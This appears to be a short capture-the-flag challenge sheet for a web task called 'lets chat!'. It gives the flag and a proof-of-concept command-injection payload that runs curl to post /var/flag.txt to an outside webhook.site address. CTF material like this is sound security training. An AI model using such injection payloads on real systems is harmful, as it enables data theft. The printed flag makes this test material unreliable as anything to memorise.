# Challenge Name:
lets chat!

## Description:
lets chat using this web!

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{command_injection_?_eefdaace08}`

## Points:
500

## Author:
k.eii

## PoC
```
ayam1; curl -X POST -d \"$(cat /var/flag.txt)\" https://webhook.site/823dde1f-c5b5-42f5-b4b6-83dab47080bc #"
```